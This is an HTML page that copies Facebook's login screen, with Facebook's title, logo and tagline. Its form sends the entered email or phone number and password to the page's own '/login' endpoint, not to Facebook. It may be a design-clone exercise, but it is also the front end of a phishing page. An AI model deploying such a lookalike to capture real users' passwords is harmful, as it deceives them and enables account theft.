```html
<!DOCTYPE html>
<html lang="en">

<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Facebook - Log in or Sign up</title>

<script src="https://cdn.tailwindcss.com"></script>

</head>

<body class="bg-gray-100">

<div class="min-h-screen flex flex-col md:flex-row items-center justify-center gap-12 px-6">

<!-- LEFT SIDE -->
<div class="max-w-lg text-center md:text-left">

<img
class="w-64 mx-auto md:mx-0"
src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png"
alt="Facebook"
/>

<p class="text-2xl md:text-3xl mt-6">
Facebook helps you connect and share with the people in your life.
</p>

</div>


<!-- RIGHT SIDE LOGIN BOX -->
<div class="bg-white shadow-xl rounded-lg p-6 w-full max-w-sm">

<form action="/login" method="POST">

<input
name="email"
type="text"
placeholder="Email address or phone number"
class="w-full border border-gray-300 p-3 rounded-lg mb-3 focus:ring-2 focus:ring-blue-500"
required
/>

<input
name="password"
type="password"
placeholder="Password"
class="w-full border border-gray-300 p-3 rounded-lg mb-3 focus:ring-2 focus:ring-blue-500"
required
/>

<button
type="submit"
class="w-full bg-blue-600 text-white py-3 rounded-lg font-semibold hover:bg-blue-700"
>
Log In
</button>

</form>

<p class="text-blue-600 text-center mt-4 cursor-pointer hover:underline">
Forgotten password?
</p>

<hr class="my-5">

<div class="text-center">

<a href="signup.html">
<button
class="bg-green-600 text-white px-6 py-3 rounded-lg font-semibold hover:bg-green-700"
>
Create new account
</button>
</a>

</div>

</div>

</div>

</body>
</html>
```
